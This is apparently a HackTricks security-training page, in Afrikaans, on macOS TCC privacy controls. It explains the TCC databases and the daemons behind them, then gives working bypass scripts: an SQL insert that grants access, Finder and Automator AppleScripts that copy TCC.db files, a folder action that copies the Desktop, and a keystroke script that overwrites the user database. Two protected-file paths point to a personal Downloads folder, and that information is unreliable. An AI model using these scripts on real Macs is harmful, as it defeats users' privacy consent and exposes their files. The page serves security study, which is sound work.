# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Basiese Inligting**

**TCC (Transparency, Consent, and Control)** is 'n sekuriteitsprotokol wat daarop fokus om programtoestemmings te reguleer. Die primêre rol daarvan is om sensitiewe funksies soos **liggingsdienste, kontakte, foto's, mikrofoon, kamera, toeganklikheid en volledige skyftoegang** te beskerm. Deur uitdruklike gebruikerstoestemming te vereis voordat 'n toepassing toegang tot hierdie elemente kry, verbeter TCC privaatheid en gebruikersbeheer oor hul data.

Gebruikers kom TCC teë wanneer toepassings toegang tot beskermde funksies versoek. Dit word sigbaar deur 'n prompt waarmee gebruikers **toegang kan goedkeur of weier**. Verder ondersteun TCC direkte gebruikerhandelinge, soos **om lêers na 'n toepassing te sleep en te laat val**, om toegang tot spesifieke lêers te verleen. Dit verseker dat toepassings slegs toegang het tot dit wat uitdruklik toegelaat is.

![n Voorbeeld van 'n TCC-prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** word hanteer deur die **daemon** wat in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` geleë is en in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` gekonfigureer is (waar die mach-diens `com.apple.tccd.system` geregistreer word).

Daar loop 'n **user-mode tccd** per aangemelde gebruiker, gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`, wat die mach-dienste `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd` registreer.

Hier kan jy die tccd sien wat as system en as user loop:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions word **van die ouer** toepassing oorgeërf en die **permissions** word **nagespoor** gebaseer op die **Bundle ID** en die **Developer ID**.

### TCC-databasisse

Die toestemmings/weierings word dan in sommige TCC-databasisse gestoor:

- Die stelselwye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Hierdie databasis word deur **SIP** beskerm, dus kan slegs ’n SIP-bypass daarin skryf.
- Die gebruiker se TCC-databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir voorkeure per gebruiker.
- Hierdie databasis word beskerm, sodat slegs prosesse met hoë TCC-voorregte, soos Full Disk Access, daarin kan skryf (maar dit word nie deur SIP beskerm nie).

> [!WARNING]
> Die vorige databasisse word ook deur **TCC beskerm vir leestoegang**. Jy sal dus **nie jou gewone gebruiker se TCC-databasis kan lees nie**, tensy dit vanuit ’n TCC-bevoorregte proses gedoen word.
>
> Onthou egter dat ’n proses met hierdie hoë voorregte (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) die gebruikers se TCC-databasis sal kan wysig.

- Daar is ’n **derde** TCC-databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om **toegang tot liggingdienste** te verkry.
- Die SIP-beskermde lêer **`/Users/carlospolop/Downloads/REG.db`** (ook deur TCC teen leestoegang beskerm) bevat die **ligging** van al die **geldige TCC-databasisse**.
- Die SIP-beskermde lêer **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ook deur TCC teen leestoegang beskerm) bevat meer TCC-toestemmings wat toegestaan is.
- Die SIP-beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar deur enigiemand leesbaar) is ’n toelaatlys van toepassings wat ’n TCC-uitsondering vereis.

> [!TIP]
> Die TCC-databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Die **notification center UI** kan **veranderinge aan die stelsel se TCC-databasis** maak:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Gebruikers kan egter reëls **met die `tccutil`-command-line utility uitvee of navraag daaroor doen**.

#### Doen navraag oor die databasisse

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Deur beide databasisse na te gaan, kan jy kontroleer watter toestemmings ’n app toegelaat of geweier het, of waarvoor dit nog nie toestemming het nie (dit sal daarvoor vra).

- Die **`service`** is die TCC-**toestemming** se string-voorstelling
- Die **`client`** is die **bundle ID** of **pad na binêre lêer** met die toestemmings
- Die **`client_type`** dui aan of dit ’n Bundle Identifier(0) of ’n absolute pad(1) is

<details>

<summary>Hoe om dit uit te voer as dit ’n absolute pad is</summary>

Doen eenvoudig **`launctl load you_bin.plist`**, met ’n plist soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- Die **`auth_value`** kan verskillende waardes hê: denied(0), unknown(1), allowed(2), of limited(3).
- Die **`auth_reason`** kan die volgende waardes hê: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Die **`csreq`**-veld dui aan hoe die binary wat uitgevoer moet word, geverifieer en die TCC-permissions toegestaan moet word:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Vir meer inligting oor die **ander velde** van die tabel, [**kyk na hierdie blogplasing**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Jy kan ook **reeds verleende toestemmings** aan apps nagaan by `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Gebruikers _kan_ **reëls uitvee of navraag daaroor doen** deur **`tccutil`** te gebruik.

#### Stel TCC-toestemmings terug
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC-handtekeningkontroles

Die TCC **databasis** stoor die **Bundle ID** van die toepassing, maar dit **stoor** ook **inligting** oor die **handtekening** om **seker te maak** dat die App wat vra om die toestemming te gebruik, die korrekte een is.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Daarom sal ander toepassings wat dieselfde naam en bundle ID gebruik, nie toegang hê tot toestemmings wat aan ander apps toegestaan is nie.

### Entitlements & TCC Permissions

Apps **het nie net nodig om** **toegang te versoek** en dit **toegestaan te word** tot sekere hulpbronne nie; hulle moet ook **die relevante entitlements hê**.\
Byvoorbeeld, **Telegram** het die entitlement `com.apple.security.device.camera` om **toegang tot die kamera te versoek**. ’n **App** wat nie hierdie **entitlement het nie, sal nie toegang tot die kamera kan verkry nie (en die gebruiker sal nie eers vir die toestemmings gevra word nie).

Let daarop dat entitlements plist-lêers is en deel van code sig vorm, verder deur spesiale slots in code sig gehash word, en óf in die kernel deur kernel-kode óf deur user model-kode met `csops(#169)` of `csops_audittoken(#170)` bevraagteken kan word.

Vir apps om egter **toegang** tot **sekere gebruikersvouers** te verkry, soos `~/Desktop`, `~/Downloads` en `~/Documents`, **hoef** hulle nie enige spesifieke **entitlements** te hê nie. Die stelsel sal toegang deursigtig hanteer en **die gebruiker vra** wanneer nodig.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple se apps **sal nie prompts genereer nie**. Hulle bevat **vooraf-toegestane regte** in hul **entitlements**-lys, wat beteken dat hulle **nooit ’n popup sal genereer nie**, en ook **nie in enige van die **TCC-databasisse sal verskyn nie.** Byvoorbeeld:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Dit sal verhoed dat Calendar die gebruiker vra om toegang tot herinneringe, kalender en die adresboek te verkry.

> [!TIP]
> Afgesien van sommige amptelike dokumentasie oor entitlements, is dit ook moontlik om nie-amptelike **interessante inligting oor entitlements in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) te vind.

Sommige TCC-permissies is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen publieke lys wat almal definieer nie, maar jy kan hierdie [**lys van bekendes**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.<sup>[[1]](#references)</sup>

### Sensitiewe onbeskermde liggings

- $HOME (self)
- $HOME/.ssh, $HOME/.aws, ens.
- /tmp

### Gebruikersbedoeling / com.apple.macl

Soos voorheen genoem, is dit moontlik om **toegang tot 'n lêer aan 'n App toe te ken deur dit na die App te sleep\&laat val**. Hierdie toegang sal nie in enige TCC-databasis gespesifiseer word nie, maar as 'n **uitgebreide** **attribuut van die lêer**. Hierdie attribuut sal die **UUID van die toegelate App stoor**:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Dit is interessant dat die **`com.apple.macl`**-attribuut deur die **Sandbox**, en nie deur tccd nie, bestuur word.
>
> Let ook daarop dat indien jy ’n lêer wat die UUID van ’n toepassing op jou rekenaar toelaat, na ’n ander rekenaar verskuif, dit nie toegang aan daardie toepassing sal verleen nie, omdat dieselfde toepassing verskillende UID's sal hê.

Die uitgebreide attribuut `com.apple.macl` **kan nie skoongemaak word** soos ander uitgebreide attribute nie, omdat dit **deur SIP beskerm word**. Soos egter [**in hierdie plasing verduidelik word**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), is dit moontlik om dit te deaktiveer deur die lêer te **zip**, dit te **verwyder** en dit dan te **unzip**.<sup>[[3]](#references)</sup>






## XNU-meganisme vir verantwoordelike proses

In macOS/iOS is die **verantwoordelike proses**-meganisme ’n kritieke sekuriteitsfunksie wat deur die **TCC (Transparency, Consent, and Control)**-raamwerk en ander sekuriteitstelsels gebruik word om na te spoor watter proses uiteindelik vir ’n aksie verantwoordelik is, selfs deur kettings van child processes heen.

Wanneer TCC toestemmings nagaan, byvoorbeeld vir die kamera, mikrofoon of ligging, kontroleer dit nie altyd die onmiddellike proses wat die versoek maak nie. In plaas daarvan kontroleer dit die **verantwoordelike proses** – gewoonlik die GUI-toepassing wat die aksie geïnisieer het, selfs wanneer die werklike versoek van ’n helper-proses of daemon afkomstig is.

<details>
<summary>Hoe die verantwoordelike proses gestel word</summary>

### Prosesstruktuurvelde

Elke proses in XNU handhaaf twee belangrike UUID-identifiseerders:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Die proses se eie UUID (van sy Mach-O-binêre lêer se `LC_UUID`-laaikommando)
- **`p_responsible_pid`**: Die PID van die verantwoordelike proses
- **`p_responsible_uuid`**: Die UUID van die verantwoordelike proses (bly behoue selfs nadat daardie proses beëindig is)

### Hoe die verantwoordelike proses gestel word

1. **Tydens prosesskepping (Fork)**

Wanneer ’n nuwe proses via `fork()` of `posix_spawn()` geskep word, word die verantwoordelike proses van die ouer geërf (die `exec()`-syscall hergebruik die bestaande `proc`-struktuur, dus word hierdie stap nie daar herhaal nie):

**Ligging**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Sleutelpunte:**
- Child processes **inherit** the ouer se `p_responsible_pid`
- Dit skep ’n **chain of responsibility** deur die proses-hiërargie
- Die verantwoordelike proses wys tipies na die oorspronklike GUI-toepassing

2. **Die kernfunksie: `proc_set_responsible_pid()`**

**Ligging**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Wat hierdie funksie doen:**
1. **Stel die verantwoordelike PID** in die teikenproses
2. **Soek die verantwoordelike proses op** met `proc_find()` (verhoog die verwysingtelling)
3. **Kopieer die UUID** van die verantwoordelike proses se `p_uuid` na die teikenproses se `p_responsible_uuid`
4. **Stel die verwysing vry** met `proc_rele()` (verlaag die verwysingtelling)

3. **Waarom beide PID en UUID stoor?**

Die dubbelstoorbenadering los ’n kritieke probleem op:

| Veld | Doel | Probleem | Oplossing |
|-------|---------|---------|----------|
| `p_responsible_pid` | Vinnige opsoek van die huidige proses | PID kan hergebruik word nadat ’n proses beëindig is | Word gebruik vir aktiewe prosesopsoek |
| `p_responsible_uuid` | Permanente identifikasie | Bly bestaan nadat die proses beëindig is | Word gebruik vir security checks en ouditering |

**Die Probleem**: As die verantwoordelike proses voor die child-proses beëindig word, kan die PID herwin en aan ’n heeltemal ander proses toegeken word.

**Die Oplossing**: Die UUID is onveranderlik en identifiseer die spesifieke binary wat verantwoordelik was uniek, selfs nadat dit beëindig is.

### Proses-skeppingsvloei
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID-bron: LC_UUID Load Command

Die UUID wat in `p_uuid` gestoor word, kom van die **Mach-O executable se `LC_UUID` load command**:

1. **Kompilasietyd**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Uitvoeringstyd**

**Ligging**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Gestoor in Prosesstruktuur**

**Ligging**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Ligging**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Invoeg in TCC

As jy op enige stadium skryftoegang tot ’n TCC-databasis kry, kan jy iets soos die volgende gebruik om ’n inskrywing by te voeg (verwyder die kommentare):

<details>

<summary>Voorbeeld van invoeging in TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

As jy daarin geslaag het om toegang tot ’n app met sekere TCC-toestemmings te verkry, raadpleeg die volgende bladsy met TCC Payloads om dit te misbruik:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Kom meer te wete oor Apple Events in:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) na FDA\*

Die TCC-naam van die Automation-toestemming is: **`kTCCServiceAppleEvents`**\
Hierdie spesifieke TCC-toestemming dui ook die **toepassing aan wat bestuur kan word** binne die TCC-databasis aan (die toestemming laat dus nie bloot toe om alles te bestuur nie).

**Finder** is ’n toepassing wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), dus, as jy **Automation**-voorregte daaroor het, kan jy sy voorregte misbruik om **dit sekere aksies te laat uitvoer**.\
In hierdie geval sal jou app die toestemming **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** benodig.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Jy kan dit misbruik om **jou eie user TCC-databasis te skryf**.

> [!WARNING]
> Met hierdie toestemming sal jy **Finder kan vra om toegang tot TCC-beperkte vouers te verkry** en die lêers aan jou te gee, maar afaik sal jy **nie Finder arbitrêre kode kan laat uitvoer** om sy FDA-toegang ten volle te misbruik nie.
>
> Daarom sal jy nie die volle FDA-vermoëns kan misbruik nie.

Dit is die TCC-prompt om Automation-voorregte oor Finder te verkry:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Let daarop dat omdat die **Automator**-app die TCC-toestemming **`kTCCServiceAppleEvents`** het, dit **enige app kan beheer**, soos Finder. As jy dus toestemming het om Automator te beheer, kan jy ook die **Finder** beheer met kode soos die een hieronder:

<details>

<summary>Kry ’n shell binne Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Dies gebeur ook met die **Script Editor app,** wat Finder kan beheer, maar met behulp van 'n AppleScript kan jy dit nie dwing om 'n script uit te voer nie.

### Automation (SE) na sommige TCC

**System Events kan Folder Actions skep, en Folder Actions kan toegang tot sommige TCC-vouers verkry** (Desktop, Documents & Downloads), dus kan 'n script soos die volgende gebruik word om hierdie gedrag te misbruik:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** aan FDA\*

Automation op **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) laat toe om **keystrokes na prosesse** te stuur. Op hierdie manier kan jy Finder misbruik om die gebruikers se TCC.db te verander of om FDA aan ’n arbitrêre app toe te ken (hoewel ’n wagwoord dalk hiervoor gevra kan word).

Finder wat gebruikers se TCC.db oorskryf—voorbeeld:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` na FDA\*

Kyk na hierdie bladsy vir sommige [**payloads om die Accessibility-permissions te abuse**](macos-tcc-payloads.md#accessibility) om byvoorbeeld na FDA\* te privesc of 'n keylogger te run.

### **Endpoint Security Client na FDA**

As jy **`kTCCServiceEndpointSecurityClient`** het, het jy FDA. Einde.

### System Policy SysAdmin File na FDA

**`kTCCServiceSystemPolicySysAdminFiles`** laat jou toe om die **`NFSHomeDirectory`**-attribuut van 'n gebruiker te **verander**, wat sy home folder verander en daarom toelaat om **TCC te bypass**.<sup>[[5]](#references)</sup>

### User TCC DB na FDA

Deur **write permissions** oor die **user TCC**-databasis te verkry, **kan jy nie** aan jouself **`FDA`**-permissions toeken nie; slegs die een wat in die system database leef, kan dit toeken.

Maar jy **kan** aan jouself **Automation rights to Finder** gee en die vorige tegniek abuse om na FDA\* te eskaleer.

### **FDA na TCC-permissions**

**Full Disk Access** se TCC-naam is **`kTCCServiceSystemPolicyAllFiles`**

Ek dink nie dit is 'n werklike privesc nie, maar net vir ingeval jy dit nuttig vind: As jy 'n program met FDA beheer, kan jy die user se TCC-databasis **modify en aan jouself enige access gee**. Dit kan nuttig wees as 'n persistence-tegniek indien jy dalk jou FDA-permissions verloor.

### **SIP Bypass na TCC Bypass**

Die system **TCC-databasis** word deur **SIP** beskerm; daarom sal slegs prosesse met die **aangeduide entitlements dit kan modify**. As 'n aanvaller dus 'n **SIP bypass** oor 'n **file** vind (in staat wees om 'n file wat deur SIP beperk word te modify), sal hy in staat wees om:

- **Die protection** van 'n TCC-databasis te remove en aan homself alle TCC-permissions te gee. Hy kan byvoorbeeld enige van hierdie files abuse:
- Die TCC systems database
- REG.db
- MDMOverrides.plist

Daar is egter nog 'n opsie om hierdie **SIP bypass te abuse om TCC te bypass**: die file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is 'n allow list van applications wat 'n TCC-exception benodig. As 'n aanvaller dus die **SIP protection** van hierdie file kan remove en sy **eie application** kan byvoeg, sal die application TCC kan bypass.\
Byvoorbeeld, om terminal by te voeg:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC-omseilings


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

